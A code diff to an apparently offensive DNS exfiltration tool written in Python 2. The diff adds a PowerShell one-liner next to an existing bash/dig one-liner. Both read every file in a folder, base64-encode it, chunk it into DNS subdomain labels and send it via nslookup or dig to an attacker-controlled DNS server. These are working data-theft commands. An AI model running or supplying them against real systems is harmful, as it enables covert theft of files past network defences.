@@ -144,6 +144,9 @@ def p_cmds(s,b,ip,z):
 		print "%s[?]%s Copy entire folder" % (c["y"], c["e"])
 		print """\t%s\x23%s for f in $(ls .); do s=%s;b=%s;c=0; for r in $(for i in $(base64 -w0 $f | sed "s/.\{$b\}/&\\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\\n$i-."; c=1; fi; done ); do dig @%s `echo -ne $r$f|tr "+" "*"` +short; done ; done""" % (c["r"], c["e"], s, b, ip )
 		print
+		print "%s[?]%s Copy entire folder in PowerShell" % (c["y"], c["e"])
+		print """\t%s\x23%s $d="%s"; $s=%s; $b=%s; Get-ChildItem "." | Foreach-Object {$a=$_.Name; $z = [System.IO.File]::ReadAllBytes($_.FullName); $e = [System.Convert]::ToBase64String($z); $l=$e.Length; $r=""; $n=0; while ($n -le ($l/$b)) { $c=$b; if (($n*$b)+$c -gt $l) { $c=$l-($n*$b) }; $r+=$e.Substring($n*$b, $c) + "-."; if (($n%%$s) -eq ($s-1)) { nslookup -type=A $r$a. $d; $r="" } $n=$n+1 } nslookup -type=A $r$a. $d }""" % (c["r"], c["e"], ip, s, b )
+		print
 		
 
 def banner():
